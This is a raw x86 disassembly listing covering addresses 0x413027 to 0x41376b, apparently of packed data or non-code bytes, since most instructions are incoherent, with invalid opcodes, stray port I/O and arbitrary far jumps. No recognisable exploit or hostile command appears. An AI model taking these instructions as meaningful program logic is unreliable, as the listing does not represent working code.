  413027:	imul   edi,DWORD PTR ds:0xf36cd755,0x1265c540
  413031:	inc    edx
  413032:	lods   eax,DWORD PTR ds:[esi]
  413033:	push   ecx
  413034:	adc    dh,BYTE PTR [ecx]
  413036:	out    0x4d,eax
  413038:	add    BYTE PTR [eax],al
  41303a:	adc    al,BYTE PTR [eax-0x64]
  41303d:	push   edx
  41303e:	adc    al,BYTE PTR [edx-0x5c]
  413041:	ins    DWORD PTR es:[edi],dx
  413042:	add    bh,BYTE PTR [ecx]
  413044:	add    cl,ch
  413046:	xor    bh,BYTE PTR [ecx]
  413048:	ins    BYTE PTR es:[edi],dx
  413049:	les    esp,FWORD PTR [ebx]
  41304b:	add    ch,BYTE PTR [esi]
  41304d:	(bad)  
  41304e:	fidiv  WORD PTR [edi]
  413050:	add    BYTE PTR [edx-0x66b2cf02],bh
  413056:	leave  
  413057:	xor    eax,0x41c79551
  41305c:	pop    edi
  41305d:	mov    ds,ecx
  41305f:	adc    eax,DWORD PTR [eax]
  413061:	mov    dh,cl
  413063:	cmp    eax,0x4cd795f
  413068:	xor    bh,BYTE PTR [edi-0x1693c832]
  41306e:	jae    0x4130a8
  413070:	ins    BYTE PTR es:[edi],dx
  413071:	dec    esi
  413072:	nop
  413073:	gs je  0x4130c2
  413076:	jb     0x4130ae
  413078:	and    BYTE PTR fs:[edi-0x6daf8bd3],al
  41307f:	cmp    BYTE PTR [edi+0x43],ah
  413082:	mov    fs,WORD PTR [ebx+0x67]
  413085:	dec    ebp
  413086:	xor    eax,0x90446853
  41308b:	cmp    edx,DWORD PTR [esi+edx*1+0x58]
  41308f:	xor    DWORD PTR [esi+0x2c],ebp
  413092:	dec    esi
  413093:	cmp    DWORD PTR [edx+0xc],esp
  413096:	add    DWORD PTR [ebx+0x68],0x0
  41309a:	jge    0x4130b0
  41309c:	inc    esi
  41309d:	sti    
  41309e:	add    BYTE PTR [eax],al
  4130a0:	push   edi
  4130a1:	xor    DWORD PTR [ecx+0x10],edx
  4130a4:	pop    ecx
  4130a5:	adc    al,0x41
  4130a7:	sti    
  4130a8:	push   edi
  4130a9:	xor    BYTE PTR [ebx-0x1],al
  4130ac:	pop    edi
  4130ad:	cmp    DWORD PTR [ebx-0x25],esp
  4130b0:	adc    eax,DWORD PTR [eax+0x63]
  4130b3:	test   al,0x32
  4130b5:	push   ebx
  4130b6:	jb     0x413084
  4130b8:	push   ss
  4130b9:	dec    esi
  4130ba:	jb     0x413080
  4130bc:	unpcklps xmm0,XMMWORD PTR [ecx+0x0]
  4130c0:	retf   0x706a
  4130c3:	je     0x413094
  4130c5:	cs je  0x41311d
  4130c8:	mov    ebx,0x6d4b722e
  4130cd:	push   0x0
  4130cf:	inc    ebx
  4130d0:	retf   0x706a
  4130d3:	je     0x413062
  4130d5:	imul   esi,DWORD PTR [eax+0x6f],0x65475dba
  4130dc:	rcl    DWORD PTR [ecx],0x3f
  4130df:	jb     0x413092
  4130e1:	popa   
  4130e2:	je     0x413128
  4130e4:	lods   eax,DWORD PTR ds:[esi]
  4130e5:	fs je  0x41315a
  4130e8:	mov    bh,0x6a
  4130ea:	inc    edi
  4130eb:	rcl    DWORD PTR gs:[eax],0x3f
  4130ef:	jb     0x413082
  4130f1:	pusha  
  4130f2:	je     0x413146
  4130f4:	ins    DWORD PTR es:[edi],dx
  4130f5:	inc    esp
  4130f6:	popa   
  4130f7:	popa   
  4130f8:	jnp    0x413127
  4130fa:	aas    
  4130fb:	outs   dx,DWORD PTR ds:[esi]
  4130fc:	push   esi
  4130fd:	ins    BYTE PTR es:[edi],dx
  4130fe:	popa   
  4130ff:	js     0x41314d
  413101:	adc    BYTE PTR [edx+0x65],dl
  413104:	add    BYTE PTR [eax],al
  413106:	ds sub eax,0x371c7472
  41310c:	dec    edi
  41310d:	gs xor al,0x2e
  413110:	add    BYTE PTR [edi+0x48],cl
  413113:	sub    eax,0x374a506e
  413118:	pop    edi
  413119:	cmp    esp,DWORD PTR gs:[ebx+0x54]
  41311d:	outs   dx,DWORD PTR ds:[esi]
  41311e:	xor    ebp,DWORD PTR ds:0x3501006e
  413124:	jo     0x41318b
  413126:	retf   0x6b63
  413129:	outs   dx,BYTE PTR ds:[esi]
  41312a:	sub    DWORD PTR [ecx+eiz*2+0x4c],ebp
  41312e:	mov    bh,0x2f
  413130:	arpl   WORD PTR [ebp+0x7c],sp
  413133:	push   edi
  413134:	outs   dx,BYTE PTR ds:[esi]
  413135:	push   ebp
  413136:	mov    ebp,DWORD PTR ds:0x76310072
  41313c:	data16 je 0x41313c
  41313f:	test   DWORD PTR [eax+0x63],ebp
  413142:	pop    ds
  413143:	test   BYTE PTR [ebx+0x66],ch
  413146:	push   ss
  413147:	mov    DWORD PTR [esi+0x5f],ebp
  41314a:	add    eax,0x316e6cd4
  41314f:	jp     0x4131bd
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	out    0x97,eax
  413154:	dec    edi
  413155:	je     0x413159
  413157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413158:	gs push esp
  41315a:	into   
  41315b:	mov    DWORD PTR [ebp+0x72],edx
  41315e:	enter  0x6444,0x51
  413162:	fcom   DWORD PTR [esi-0x6a0affbe]
  413168:	fs ins DWORD PTR es:[edi],dx
  41316a:	add    BYTE PTR [eax],al
  41316c:	iret   
  41316d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41316e:	push   eax
  41316f:	arpl   bx,ax
  413171:	jnp    0x413174
  413173:	dec    esp
  413174:	sahf   
  413175:	push   0x6d
  413177:	jae    0x41311a
  413179:	std    
  41317a:	push   ebp
  41317b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41317d:	push   esp
  41317e:	push   0x32588e63
  413183:	pop    edi
  413184:	popf   
  413185:	add    BYTE PTR [edi+0x3f],bl
  413188:	xor    esp,ebp
  41318a:	pop    edi
  41318b:	push   0xffffff84
  41318d:	dec    BYTE PTR [edi+0x54]
  413190:	xchg   BYTE PTR [esi+0x5f],dl
  413193:	outs   dx,BYTE PTR ds:[esi]
  413194:	sbb    DWORD PTR [edi],0x1158766b
  41319a:	pop    edi
  41319b:	gs push esp
  41319d:	push   ds
  41319e:	add    al,0x0
  4131a0:	push   edx
  4131a1:	pop    ds
  4131a2:	pop    ebx
  4131a3:	jo     0x4131ea
  4131a5:	jle    0x4131ba
  4131a7:	cs dec ebp
  4131a9:	adc    DWORD PTR [eax+0x0],ebp
  4131ac:	jb     0x4131be
  4131ae:	push   esi
  4131af:	je     0x413217
  4131b1:	mov    ebp,0x14026e60
  4131b6:	loopne 0x41320e
  4131b8:	sbb    eax,0x2536cc39
  4131bd:	xor    ebx,ecx
  4131bf:	pusha  
  4131c0:	push   esi
  4131c1:	adc    al,0xaa
  4131c3:	pusha  
  4131c4:	add    ecx,DWORD PTR [eax-0x54]
  4131c7:	imul   eax,DWORD PTR [edx],0x360aa31
  4131cd:	dec    eax
  4131ce:	shl    BYTE PTR [ecx+0x0],0x0
  4131d2:	push   cs
  4131d3:	aaa    
  4131d4:	enter  0xd24f,0x46
  4131d8:	mov    al,0x69
  4131da:	add    BYTE PTR [eax-0x72],cl
  4131dd:	push   ebp
  4131de:	rcl    BYTE PTR [ebx],cl
  4131e0:	stos   BYTE PTR es:[edi],al
  4131e1:	pusha  
  4131e2:	jecxz  0x41322b
  4131e4:	stos   BYTE PTR es:[edi],al
  4131e5:	fadd   QWORD PTR [bp-0x74]
  4131e9:	ss mov ebp,0x31607932
  4131ef:	push   edi
  4131f0:	jns    0x41324e
  4131f2:	rol    DWORD PTR [edi-0x58],0x66
  4131f6:	sahf   
  4131f7:	dec    ecx
  4131f8:	push   eax
  4131f9:	push   esi
  4131fa:	xchg   edx,eax
  4131fb:	push   edi
  4131fc:	inc    esp
  4131fd:	push   esi
  4131fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ff:	sub    eax,0x35906d4d
  413204:	push   ebx
  413205:	popa   
  413206:	popa   
  413207:	inc    esi
  413208:	push   eax
  413209:	push   edx
  41320a:	dec    ax
  41320c:	inc    esp
  41320d:	dec    edi
  41320e:	xchg   edx,eax
  41320f:	cmp    eax,0x143103e7
  413214:	out    0x3,eax
  413216:	xor    DWORD PTR [edi+eiz*8],edx
  413219:	add    esi,DWORD PTR [ecx]
  41321b:	adc    al,0xe7
  41321d:	add    esi,DWORD PTR [ecx]
  41321f:	adc    al,0xe7
  413221:	add    esi,DWORD PTR [ecx]
  413223:	adc    al,0xe7
  413225:	add    esi,DWORD PTR [ecx]
  413227:	adc    al,0xe7
  413229:	add    esi,DWORD PTR [ecx]
  41322b:	adc    al,0xe7
  41322d:	add    esi,DWORD PTR [ecx]
  41322f:	adc    al,0x0
  413231:	jmp    0xe9414668
  413236:	add    BYTE PTR [eax],al
  413238:	xor    dl,BYTE PTR [eax+eax*1]
  41323b:	jmp    0xe9414672
  413240:	xor    dl,BYTE PTR [eax+eax*1]
  413243:	jmp    0xe941467a
  413248:	xor    dl,BYTE PTR [eax+eax*1]
  41324b:	jmp    0xe9414682
  413250:	xor    dl,BYTE PTR [eax+eax*1]
  413253:	jmp    0xe941468a
  413258:	xor    dl,BYTE PTR [eax+eax*1]
  41325b:	jmp    0xe9414692
  413260:	xor    dl,BYTE PTR [eax+eax*1]
  413263:	jmp    0xe941469a
  413268:	xor    dl,BYTE PTR [eax+eax*1]
  41326b:	jmp    0xe94146a2
  413270:	xor    dl,BYTE PTR [eax+eax*1]
  413273:	jmp    0xa0967eaa
  413278:	outs   dx,BYTE PTR ds:[esi]
  413279:	adc    al,0x79
  41327b:	or     al,0x3d
  41327d:	cld    
  41327e:	push   edi
  41327f:	or     al,0x3e
  413281:	add    al,0x34
  413283:	xor    DWORD PTR [esi-0xb],ecx
  413286:	das    
  413287:	adc    eax,0xf922ed4d
  41328c:	sbb    al,0x5c
  41328e:	and    edi,ecx
  413290:	and    al,0x5c
  413292:	sub    ecx,DWORD PTR [ebx*1+0x45045806]
  413299:	push   es
  41329a:	pop    eax
  41329b:	int3   
  41329c:	add    BYTE PTR [eax],al
  41329e:	inc    edx
  41329f:	push   es
  4132a0:	pop    eax
  4132a1:	les    eax,FWORD PTR [edx+0x6]
  4132a4:	pop    eax
  4132a5:	int3   
  4132a6:	inc    edx
  4132a7:	push   es
  4132a8:	pop    eax
  4132a9:	les    esp,FWORD PTR [edx]
  4132ab:	push   es
  4132ac:	pop    eax
  4132ad:	add    BYTE PTR ds:0xc4654318,ch
  4132b3:	dec    ebx
  4132b4:	pop    ebp
  4132b5:	je     0x4132e8
  4132b7:	popaw  
  4132b9:	push   ebx
  4132ba:	mov    eax,ds:0x7d657468
  4132bf:	dec    esi
  4132c0:	outs   dx,BYTE PTR ds:[esi]
  4132c1:	outs   dx,WORD PTR ds:[esi]
  4132c3:	adc    eax,0x2b7a6567
  4132c8:	popa   
  4132c9:	ins    BYTE PTR es:[edi],dx
  4132ca:	sub    ebp,DWORD PTR [edx]
  4132cc:	cs fs pop esp
  4132cf:	cmp    DWORD PTR [eax],eax
  4132d1:	dec    ecx
  4132d2:	mov    ebx,0x76776b04
  4132d7:	adc    DWORD PTR [eax+0x72],edx
  4132da:	scas   eax,DWORD PTR es:[edi]
  4132db:	cmp    BYTE PTR [ecx+0x73],ah
  4132de:	retf   
  4132df:	adc    eax,0x51b66f4f
  4132e4:	jae    0x413347
  4132e6:	mov    edx,0xb9465c62
  4132eb:	addr16 pop esp
  4132ed:	push   eax
  4132ee:	pushf  
  4132ef:	push   edx
  4132f0:	arpl   WORD PTR [ecx-0x52],bp
  4132f3:	push   0x594465c
  4132f8:	pop    esp
  4132f9:	dec    eax
  4132fa:	scas   eax,DWORD PTR es:[edi]
  4132fb:	push   0x8187374
  413300:	imul   esp,DWORD PTR [esi+0x0],0x0
  413304:	test   BYTE PTR [ebx+0x5d],ah
  413307:	jb     0x41336e
  413309:	cld    
  41330a:	inc    ebp
  41330b:	popa   
  41330c:	push   0x2a
  41330e:	pop    esp
  41330f:	push   eax
  413310:	pop    esp
  413311:	push   ecx
  413312:	arpl   WORD PTR [ecx+0x6e],bp
  413315:	addr16 pop esp
  413317:	inc    esi
  413318:	adc    al,0x8
  41331a:	pop    esp
  41331b:	dec    eax
  41331c:	das    
  41331d:	addr16 je 0x413393
  413320:	fadd   DWORD PTR [edi]
  413322:	imul   esp,DWORD PTR [esi+0x44],0x63
  413326:	pop    ebp
  413327:	jb     0x41335a
  413329:	adc    BYTE PTR [eax],bh
  41332b:	inc    esi
  41332c:	push   eax
  41332d:	sbb    eax,0xc1505138
  413332:	pop    esi
  413333:	fs jne 0x41335a
  413336:	popa   
  413337:	ins    BYTE PTR es:[edi],dx
  413338:	inc    esi
  413339:	adc    cl,BYTE PTR [edi+eiz*2+0x22]
  41333d:	(bad)  
  41333e:	push   0x3fd72872
  413343:	push   esp
  413344:	add    DWORD PTR [ebx-0x54e28e98],eax
  41334a:	xor    al,0x6d
  41334c:	pop    ss
  41334d:	out    0x50,eax
  41334f:	pop    edi
  413350:	add    edx,eax
  413352:	xor    eax,0x137d1046
  413357:	pop    esp
  413358:	loop   0x413325
  41335a:	dec    edi
  41335b:	arpl   bp,dx
  41335d:	jbe    0x4133c9
  41335f:	pop    edi
  413360:	aad    0xa9
  413362:	pusha  
  413363:	dec    eax
  413364:	enter  0x4d9d,0x6d
  413368:	add    BYTE PTR [eax],al
  41336a:	jecxz  0x41330f
  41336c:	xor    eax,0x497ae546
  413371:	ins    DWORD PTR es:[edi],dx
  413372:	ret    0x13e
  413375:	push   eax
  413376:	sar    BYTE PTR ds:0x3cc67554,1
  41337c:	pop    ebp
  41337d:	add    BYTE PTR [ecx+0x3e],bh
  413380:	push   esp
  413381:	je     0x4133fa
  413383:	dec    esp
  413384:	arpl   WORD PTR [bx+di],si
  413387:	or     BYTE PTR [ecx+0x63],dl
  41338a:	mov    ds:0x9f6745ad,eax
  41338f:	pop    eax
  413390:	add    al,0x75
  413392:	xchg   edx,eax
  413393:	push   ebp
  413394:	xor    eax,0x25fd8566
  413399:	xchg   DWORD PTR [si+0x4],edx
  41339d:	pop    esp
  41339e:	jbe    0x413395
  4133a0:	dec    edx
  4133a1:	push   ecx
  4133a2:	jne    0x4133b8
  4133a4:	sub    al,0x32
  4133a6:	xor    DWORD PTR [ebp+0xd],ecx
  4133a9:	push   ebx
  4133aa:	pop    ebp
  4133ab:	xor    eax,0x2d756803
  4133b0:	sbb    DWORD PTR [edi+ebp*2],eax
  4133b3:	dec    eax
  4133b4:	test   DWORD PTR [edi+ecx*2+0x2d],0x394a652d
  4133bc:	out    0x32,eax
  4133be:	sbb    al,0x36
  4133c0:	repz dec esi
  4133c2:	push   es
  4133c3:	inc    edx
  4133c4:	int3   
  4133c5:	aaa    
  4133c6:	hlt    
  4133c7:	sub    edx,eax
  4133c9:	push   edx
  4133ca:	add    eax,0x37d939
  4133cf:	add    ah,ah
  4133d1:	sub    al,0xbd
  4133d3:	pop    edi
  4133d4:	adc    al,0x47
  4133d6:	mov    edx,0xcc2ef023
  4133db:	push   0x60cb2dd6
  4133e0:	jecxz  0x4133f5
  4133e2:	call   0xe364:0x9e47cf66
  4133e9:	cmp    BYTE PTR [ebx-0x65d336c2],bh
  4133ef:	rol    BYTE PTR [bx+di-0x55],cl
  4133f3:	das    
  4133f4:	aam    0x47
  4133f6:	mov    BYTE PTR [edi+0x11],ah
  4133f9:	push   ebx
  4133fa:	mov    gs,WORD PTR [eax-0x36]
  4133fd:	xor    al,0x85
  4133ff:	pop    edi
  413400:	xchg   edx,eax
  413401:	inc    edx
  413402:	out    0x37,eax
  413404:	outs   dx,BYTE PTR ds:[esi]
  413405:	inc    esp
  413406:	pop    edx
  413407:	dec    edi
  413408:	xchg   esi,eax
  413409:	dec    eax
  41340a:	dec    edx
  41340b:	ins    BYTE PTR es:[edi],dx
  41340c:	xor    DWORD PTR [ebx+0x40],esp
  41340f:	push   eax
  413410:	xchg   edx,eax
  413411:	inc    ebx
  413412:	sub    eax,DWORD PTR [eiz*2-0x7bacc8b3]
  413419:	sub    eax,0x60896333
  41341e:	add    BYTE PTR [esi],bl
  413420:	and    ah,BYTE PTR [ecx+0x46]
  413423:	adc    eax,0x1e5c141d
  413428:	dec    esp
  413429:	cs adc BYTE PTR cs:[edi+0x37],cl
  41342e:	add    bh,al
  413430:	pop    ebp
  413431:	cs addr16 jmp 0x65583438
  413438:	pop    ebp
  413439:	das    
  41343a:	add    DWORD PTR [eax+eax*1+0x25],esp
  41343e:	bound  eax,QWORD PTR fs:[eax]
  413441:	sub    eax,0x204455f0
  413446:	arpl   WORD PTR [ecx+eax*2],dx
  413449:	mov    esp,0xb546534e
  41344e:	bound  edx,QWORD PTR [edi+ecx*2]
  413451:	stos   BYTE PTR es:[edi],al
  413452:	cli    
  413453:	ss jno 0x41342b
  413456:	cmovb  esi,DWORD PTR [edi-0x17]
  41345a:	inc    ebx
  41345b:	xor    DWORD PTR [esi-0x4b],esp
  41345e:	out    0x5e,eax
  413460:	jb     0x41342e
  413462:	es pop ecx
  413464:	ins    BYTE PTR es:[edi],dx
  413465:	mov    esi,0xba6c5ed0
  41346a:	repz dec BYTE PTR [edi-0x5c]
  41346e:	push   ds
  41346f:	push   ebp
  413470:	jae    0x41340f
  413472:	rcl    DWORD PTR [ebp+0x54],1
  413475:	mov    ecx,0xb1200612
  41347a:	xlat   BYTE PTR ds:[ebx]
  41347b:	sub    ah,BYTE PTR [ebx-0x63]
  41347e:	std    
  41347f:	push   esp
  413480:	push   esp
  413481:	xchg   BYTE PTR [edi-0x7f779dd0],dl
  413487:	adc    al,0x51
  413489:	push   esi
  41348a:	jg     0x4134d4
  41348c:	jne    0x4134d6
  41348e:	xor    DWORD PTR [ecx],0x5c
  413491:	cs cdq 
  413493:	das    
  413494:	bound  ecx,QWORD PTR [eax-0x67]
  413497:	arpl   WORD PTR [ecx+0x0],ax
  41349a:	add    BYTE PTR [eax],al
  41349c:	dec    ecx
  41349d:	or     BYTE PTR [ecx+0x5c],al
  4134a0:	dec    ebx
  4134a1:	dec    ebp
  4134a2:	je     0x413509
  4134a4:	push   ds
  4134a5:	add    al,0x50
  4134a7:	and    dh,bl
  4134a9:	icebp  
  4134aa:	dec    edi
  4134ab:	jb     0x4134f4
  4134ad:	pop    esi
  4134ae:	popa   
  4134af:	jae    0x4134ec
  4134b1:	sub    DWORD PTR [ebx+0x6e],ebp
  4134b4:	cmp    DWORD PTR [esp+ebx*2],ebp
  4134b7:	push   ecx
  4134b8:	sbb    eax,DWORD PTR [ebx+ebp*2]
  4134bb:	outs   dx,DWORD PTR ds:[esi]
  4134bc:	and    al,0x32
  4134be:	pop    ebp
  4134bf:	jb     0x413489
  4134c1:	add    al,0x6b
  4134c3:	data16 lods al,BYTE PTR ds:[esi]
  4134c5:	push   eax
  4134c6:	pop    ebp
  4134c7:	jb     0x4134f6
  4134c9:	cld    
  4134ca:	inc    edx
  4134cb:	ins    BYTE PTR es:[edi],dx
  4134cc:	xchg   DWORD PTR [ebx],esi
  4134ce:	pop    ebp
  4134cf:	ins    BYTE PTR es:[edi],dx
  4134d0:	fist   DWORD PTR [ebp+edi*1+0x50]
  4134d4:	fld    QWORD PTR ds:0x5e5c753f
  4134da:	inc    esi
  4134db:	push   esp
  4134dc:	cwde   
  4134dd:	icebp  
  4134de:	xor    ah,BYTE PTR [eax]
  4134e0:	sar    BYTE PTR [eax],0x69
  4134e3:	les    eax,FWORD PTR gs:[edx]
  4134e6:	aas    
  4134e7:	push   esp
  4134e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134e9:	cmp    BYTE PTR [edx+eiz*2-0x57],ch
  4134ed:	arpl   WORD PTR [eax],ax
  4134ef:	push   ebx
  4134f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f1:	pop    edi
  4134f2:	je     0x41356b
  4134f4:	mov    ecx,0x8f5c6163
  4134f9:	xor    eax,0x35a9626b
  4134fe:	dec    edi
  4134ff:	inc    ebx
  413500:	add    BYTE PTR [eax],al
  413502:	mov    DWORD PTR [ecx],eax
  413504:	inc    ecx
  413505:	pop    esp
  413506:	fisttp DWORD PTR [ebp+0x74]
  413509:	gs into 
  41350b:	in     al,dx
  41350c:	dec    edi
  41350d:	and    BYTE PTR [edi],bh
  41350f:	clc    
  413510:	dec    edi
  413511:	jb     0x41357a
  413513:	pop    esi
  413514:	popa   
  413515:	jae    0x413548
  413517:	pop    edx
  413518:	imul   ebp,DWORD PTR [ebp-0x69],0x605c684c
  41351f:	jmp    0x5f62:0x4f866d2f
  413526:	arpl   WORD PTR [ebx+0x74f6d30],bp
  41352c:	dec    ebx
  41352d:	pop    edi
  41352e:	arpl   WORD PTR [eax],dx
  413530:	cmp    BYTE PTR [ebp+0x45],al
  413533:	push   cs
  413534:	bound  ebx,QWORD PTR [edi+0x5d]
  413537:	cli    
  413538:	ds aas 
  41353a:	popa   
  41353b:	clc    
  41353c:	aaa    
  41353d:	inc    ecx
  41353e:	inc    esp
  41353f:	mov    edi,0x1b5d465e
  413544:	and    al,0x38
  413546:	push   ecx
  413547:	repz bound ebp,QWORD PTR [ebx+0xc]
  41354b:	rdtsc  
  41354d:	inc    ecx
  41354e:	add    eax,0x136c64e6
  413553:	int3   
  413554:	dec    edi
  413555:	add    dl,ah
  413557:	aad    0x5b
  413559:	je     0x413559
  41355b:	retf   
  41355c:	dec    edi
  41355d:	arpl   bp,bx
  41355f:	ins    DWORD PTR es:[edi],dx
  413560:	gs ins DWORD PTR es:[edi],dx
  413562:	adc    ecx,esp
  413564:	gs push ecx
  413566:	add    BYTE PTR [eax],al
  413568:	repnz imul esi,DWORD PTR [ecx],0x43
  41356c:	add    eax,0xd4744e6a
  413571:	ins    BYTE PTR es:[edi],dx
  413572:	sub    eax,0x21b31150
  413577:	push   eax
  413578:	ret    
  413579:	xchg   ebp,eax
  41357a:	pop    ebx
  41357b:	arpl   dx,ax
  41357d:	cdq    
  41357e:	push   0x6d
  413580:	iret   
  413581:	mov    esp,DWORD PTR [ebp+0x5c]
  413584:	loopne 0x4135ef
  413586:	sub    eax,0x5f919e6d
  41358b:	pop    edi
  41358c:	mov    ds:0x8d4535ad,eax
  413591:	adc    al,0x56
  413593:	data16 jbe 0x4135be
  413596:	cmp    al,BYTE PTR [edi+0x4e]
  413599:	fs sub al,0x30
  41359c:	jo     0x4135df
  41359e:	push   ebx
  41359f:	imul   esi,DWORD PTR [edi+0x60],0x53550417
  4135a6:	dec    ebx
  4135a7:	arpl   WORD PTR [ebx+0x35],dx
  4135aa:	inc    ebx
  4135ab:	aaa    
  4135ac:	jo     0x413603
  4135ae:	pop    ss
  4135af:	dec    ecx
  4135b0:	jge    0x413609
  4135b2:	sbb    al,0x58
  4135b4:	push   edx
  4135b5:	push   edx
  4135b6:	xor    esi,DWORD PTR [ecx+edx*1]
  4135b9:	sbb    DWORD PTR fs:[ebx+0x31],esp
  4135bd:	pop    eax
  4135be:	es pusha 
  4135c0:	dec    esp
  4135c1:	or     BYTE PTR ss:[eax+0x60],ah
  4135c5:	push   edi
  4135c6:	sub    BYTE PTR [edx+esi*8],dh
  4135c9:	push   edi
  4135ca:	sub    bl,BYTE PTR [ecx+0x0]
  4135cd:	add    BYTE PTR ds:0x1382531,bl
  4135d3:	hlt    
  4135d4:	mov    dl,0x5c
  4135d6:	sbb    eax,0xf02fe731
  4135db:	inc    eax
  4135dc:	fld    TBYTE PTR [eax-0x11]
  4135df:	pop    edi
  4135e0:	mov    bh,0x3
  4135e2:	fld    QWORD PTR [esi-0x2c]
  4135e5:	and    DWORD PTR ds:0x3b335,ecx
  4135eb:	sub    ecx,ebp
  4135ed:	push   edi
  4135ee:	fdiv   QWORD PTR [ecx+edi*4]
  4135f1:	push   0x649351fd
  4135f6:	loopne 0x413623
  4135f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f9:	sub    esp,ecx
  4135fb:	push   edi
  4135fc:	fiadd  DWORD PTR [ebx]
  4135fe:	loopne 0x41362a
  413600:	test   DWORD PTR [edi-0x3c],edx
  413603:	xor    al,0x79
  413605:	push   0x648b51d5
  41360a:	mov    al,ds:0x5aaf002c
  41360f:	add    BYTE PTR fs:[edx+0x5e743293],bl
  413616:	mov    WORD PTR [esi+0x63],es
  413619:	cmp    eax,0x5a5f287b
  41361e:	gs push edx
  413620:	pop    eax
  413621:	cmp    DWORD PTR [ecx+0x0],eax
  413624:	add    BYTE PTR [eax],dh
  413626:	xchg   ebx,eax
  413627:	inc    ebp
  413628:	je     0x413672
  41362a:	push   ecx
  41362b:	sub    BYTE PTR [ebx+0x3b],ah
  41362e:	jns    0x41368b
  413630:	je     0x413673
  413632:	add    BYTE PTR [eax],al
  413634:	and    eax,0x2d11745b
  413639:	inc    esp
  41363a:	pop    edi
  41363b:	adc    eax,0x747146d
  413640:	pop    esi
  413641:	inc    eax
  413642:	pop    edi
  413643:	std    
  413644:	pop    esi
  413645:	hlt    
  413646:	dec    edi
  413647:	or     BYTE PTR [ecx+0x2c],bl
  41364a:	add    BYTE PTR ds:0x2f5f4014,ah
  413650:	adc    ch,BYTE PTR [eax]
  413652:	fs add al,0x7
  413655:	adc    al,0x5c
  413657:	mov    edx,0xda633ff5
  41365c:	push   eax
  41365d:	xor    BYTE PTR [edi-0x23],bl
  413660:	xor    bl,BYTE PTR [eax+0x4f]
  413663:	aam    0xdd
  413665:	xor    al,0x69
  413667:	pop    ss
  413668:	or     DWORD PTR [ebx+0x74],ebx
  41366b:	jmp    0xbaa8828e
  413670:	(bad)  
  413671:	sub    BYTE PTR [edx-0x50],dh
  413674:	adc    BYTE PTR [eax],dh
  413676:	pop    edi
  413677:	popf   
  413678:	xor    bl,BYTE PTR [eax+0x46]
  41367b:	(bad)  
  41367c:	aad    0x44
  41367e:	push   0x5c641aaf
  413683:	fidiv  DWORD PTR [edx]
  413685:	pop    eax
  413686:	inc    esi
  413687:	add    BYTE PTR [edi+ebp*1-0x12299791],bl
  41368e:	dec    edi
  41368f:	pop    esp
  413690:	in     al,0x15
  413692:	pop    esp
  413693:	inc    esi
  413694:	mov    cl,0x59
  413696:	popa   
  413697:	pop    edx
  413698:	add    BYTE PTR [eax],al
  41369a:	xor    DWORD PTR [esp+ebp*2],0x6eea1861
  4136a1:	imul   esp,DWORD PTR [ecx+esi*1+0x69],0x63353e61
  4136a9:	gs cmp dh,dh
  4136ac:	ja     0x41371b
  4136ae:	jl     0x4136c0
  4136b0:	pop    esp
  4136b1:	jb     0x413728
  4136b3:	das    
  4136b4:	popa   
  4136b5:	outs   dx,BYTE PTR ds:[esi]
  4136b6:	and    al,0x5f
  4136b8:	popa   
  4136b9:	jb     0x4136f1
  4136bb:	xor    DWORD PTR [edx+0x73],esi
  4136be:	dec    BYTE PTR [ebp+0x69]
  4136c1:	ins    BYTE PTR es:[edi],dx
  4136c2:	fsubr  st,st(1)
  4136c4:	imul   edi,DWORD PTR gs:[edx+esi*1+0x341c697a],0x59302e5d
  4136d0:	ins    BYTE PTR es:[edi],dx
  4136d1:	add    BYTE PTR [ebx+0x33],cl
  4136d4:	data16 je 0x41367e
  4136d7:	ss jb  0x41373f
  4136da:	ins    BYTE PTR es:[edi],dx
  4136db:	dec    ebx
  4136dc:	gs ins BYTE PTR es:[edi],dx
  4136de:	jne    0x4136c7
  4136e0:	fs ins BYTE PTR es:[edi],dx
  4136e2:	ins    BYTE PTR es:[edi],dx
  4136e3:	add    BYTE PTR ss:[ebx-0x41],dl
  4136e7:	sub    esi,DWORD PTR [edi+esi*2+0x69]
  4136eb:	pop    edi
  4136ec:	popa   
  4136ed:	pop    esp
  4136ee:	xchg   esi,eax
  4136ef:	pop    esi
  4136f0:	ins    BYTE PTR es:[edi],dx
  4136f1:	gs ret 0x6c5e
  4136f5:	ins    BYTE PTR es:[edi],dx
  4136f6:	imul   esi,ebp,0x32c16c3e
  4136fc:	outs   dx,BYTE PTR ds:[esi]
  4136fd:	je     0x4136ff
  4136ff:	add    BYTE PTR [eax-0x2],bl
  413702:	ins    DWORD PTR es:[edi],dx
  413703:	jae    0x413736
  413705:	xchg   edi,eax
  413706:	bound  ebp,QWORD PTR [ebp+ecx*8+0x69]
  41370a:	inc    ebp
  41370b:	addr16 ret 
  41370d:	stos   BYTE PTR es:[edi],al
  41370e:	cmp    DWORD PTR [ebp-0x5e],ebp
  413711:	aas    
  413712:	add    DWORD PTR [ebx-0x5e],edx
  413715:	mov    BYTE PTR [ebx+0x0],dl
  413718:	or     DWORD PTR [esp+edx*2+0x5efb3171],0x33ab8572
  413723:	arpl   WORD PTR [edx+edx*2-0x10ae9ca8],dx
  41372a:	pop    eax
  41372b:	jb     0x41375e
  41372d:	push   ds
  41372e:	gs jb  0x413798
  413731:	push   eax
  413732:	push   esi
  413733:	and    BYTE PTR [ebp+0x4],bh
  413736:	push   esp
  413737:	arpl   WORD PTR [ecx],si
  413739:	push   ds
  41373a:	gs jb  0x41379c
  41373d:	or     BYTE PTR [esi+0x2e],dl
  413740:	jns    0x41374c
  413742:	push   ebx
  413743:	je     0x413776
  413745:	(bad)  
  413746:	fs jb  0x413790
  413749:	adc    BYTE PTR [esi+0x2e],dl
  41374c:	pop    esp
  41374d:	mov    esi,0x1e317266
  413752:	gs jb  0x413774
  413755:	or     BYTE PTR [esi+0x2e],dl
  413758:	add    DWORD PTR [ebx+edx*2],ecx
  41375b:	jno    0x41378e
  41375d:	jle    0x4137c5
  41375f:	jb     0x413768
  413761:	rcl    BYTE PTR [ebx+0x2e],1
  413764:	add    BYTE PTR [eax],al
  413766:	loope  0x413739
  413768:	push   ebx
  413769:	je     0x41379c
  41376b:	jnp    0x4137cf
